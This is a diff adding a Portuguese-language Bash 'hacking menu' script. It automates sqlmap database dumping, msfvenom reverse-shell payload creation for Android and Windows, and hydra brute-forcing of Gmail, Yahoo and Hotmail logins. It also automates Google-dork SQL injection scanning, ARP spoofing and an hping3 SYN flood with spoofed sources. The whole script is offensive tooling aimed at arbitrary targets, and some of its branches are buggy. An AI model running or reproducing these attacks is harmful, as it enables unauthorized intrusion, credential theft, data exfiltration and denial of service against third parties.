@@ -1,0 +1,214 @@
+#! /bin/bash
+#Script Version 0.1
+#Create By M0NST4R
+#Date 2015
+#For Futures upgrades, news options will be added with time
+
+echo Digite help para os comandos:
+read comandos
+
+if [ $comandos = "help" ]; then
+echo 1 = sqli
+echo 2 = msfpayloads
+echo 3 = Nmap Scan
+echo 4 = Brute Force Emails
+echo 5 = Inurlscan
+echo 6 = Reativar wlan0
+echo 7 = Ativar rede wlan0mon em modo monitor
+echo 8 = arpspoof attack
+echo 9 = DDoS Attack
+echo 10 = Créditos
+fi
+
+if [ $comandos = "1" ]; then
+echo para selecionar mais colunas use ,
+echo exemplo: usuario,senha
+echo alvo:
+read alvo
+sqlmap -u $alvo --dbs
+
+echo nome da DB: 
+read db
+
+sqlmap -u $alvo -D $db --tables
+
+echo nome da tabela:
+read tl
+
+sqlmap -u $alvo -D $db -T $tl --columns
+
+echo nome da coluna:
+read cl
+
+sqlmap -u $alvo -D $db -T $tl -C $cl --dump
+
+echo DUMPED
+fi
+
+if [ $comandos = "10" ]; then
+echo Coded By M0NST4R
+echo Greatz For  B43L-STEALTH-HAXSTROKE-SECDET-PLASTYNE-DESCONN3CT
+echo             B4C0N-F0UREYER-SUBKLEZ-ISABEL-RAGE e o resto da quebrada
+fi
+
+if [ $comandos = "2" ]; then
+echo 1 = android 
+echo 2 = windows
+read comandos
+if [ $comandos = "1" ]; then
+echo Digite o ip local:
+read ip
+echo Digite uma porta:
+read porta
+echo Nome do apk:
+read nome
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta R > /root/Documentos/$nome.apk
+echo arquivo criado com sucesso caso não de algum erro
+fi
+fi
+if [ $comandos = "2" ]; then
+echo Digite o ip local:
+read ip
+echo Digite uma porta:
+read porta
+echo Nome do exe:
+read nome
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta X > /root/Documentos/$nome.exe
+echo arquivo criado com sucesso caso não de algum e
+fi
+if [ $comandos = "3" ]; then
+echo Ip ou url do alvo:
+read target
+
+nmap -T4 -A -v -sS $target
+
+echo Scan sucess
+fi
+
+if [ $comandos = "4" ]; then
+
+echo Brute Force Script In Bash
+echo Create By M0NST4R
+echo Nota: Tenha wordlists!
+echo Escolha o serviço smtp: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:
+read smtp
+echo Email alvo:
+read email
+echo Onde a wordlist se encontra: 
+read wordlist
+
+hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp
+fi
+
+if [ $comandos = "5" ]; then
+echo Simplifier Inurlbr By M0NST4R
+echo 1 = Instalar php5-curl
+echo 2 = baixar inurlbr
+echo 3 = Simplifier Inurlbr
+echo 4 = auto sqli database view
+echo 4 = Créditos
+read comandos
+
+if [ $comandos = "1" ]; then
+apt-get install php5-curl
+clear
+fi
+
+if  [ $comandos = "2" ]; then
+wget github.com/googleinurl/SCANNER-INURLBR/raw/master/inurlbr.php
+chmod a+x inurlbr.php
+clear
+fi
+
+if [ $comandos = "3" ]; then
+echo dork:
+read dork
+echo Separe por \",\" 
+echo engines:
+read engine
+echo vulls em txt:
+read vull
+php inurlbr.php  --dork ""$dork""  -s $vull.txt --exploit-get "'?0x27" -q $engine
+fi
+
+if [ $comandos = "5" ]; then
+echo Coded By M0NST4R
+echo For Stealth
+echo Greatz
+echo B43L-Stealth-Hax Stroke-Névoa negra-M4GN4STIC-B4C0N-Plastyne
+echo D3SCONN3CT-CYPHER-J3SUS-Rage-Isabel-Subklez-Sei lá nesse carai
+fi
+if [ $comandos = "4" ]; then
+echo dork:
+read dork
+./inurlbr.php --dork "$dork" -s get.txt --exploit-get "'?0x27" --command-vul 'sudo sqlmap -u _TARGETFULL_ --dbs'
+
+echo nome da DB: 
+read db
+
+sqlmap -u $alvo -D $db --tables
+
+echo nome da tabela:
+read tl
+
+sqlmap -u $alvo -D $db -T $tl --columns
+
+echo nome da coluna:
+read cl
+
+sqlmap -u $alvo -D $db -T $tl -C $cl --dump
+
+echo DUMPED
+fi
+fi
+
+if [ $comandos = "6" ]; then
+iw dev wlan0mon del
+iw phy phy0 interface add wlan0 type managed
+fi
+
+if [ $comandos = "7" ]; then
+ifconfig wlan0mon down
+iwconfig wlan0mon mode monitor
+ifconfig wlan0mon up
+fi
+
+if [ $comandos = "8" ]; then
+echo 1 = arpsoof sniffer attack
+echo 2 = ativar encaminhamento de pacotes
+read comandos
+
+if [ $comandos = "1" ]; then
+echo  interface
+read int
+echo ip do alvo
+read alvo
+echo ip que seu alvo vai mapear para seu mac
+read alvo1
+
+arpspoof -i $int -t $alvo $alvo1
+arpspoof -i $int -t $alvo1 $alvo
+
+fi
+if [ $comandos = "2" ]; then
+
+"echo" "1" > /proc/sys/net/ipv4/ip_forward
+
+fi
+fi
+
+if [ $comandos = "9" ]; then
+echo hping3
+read comandos
+
+if [ $comandos = "hping3" ]; then
+echo ip
+read ip
+echo porta
+read porta
+
+hping3 $ip -S -p $porta --flood --rand-source
+fi
+fi
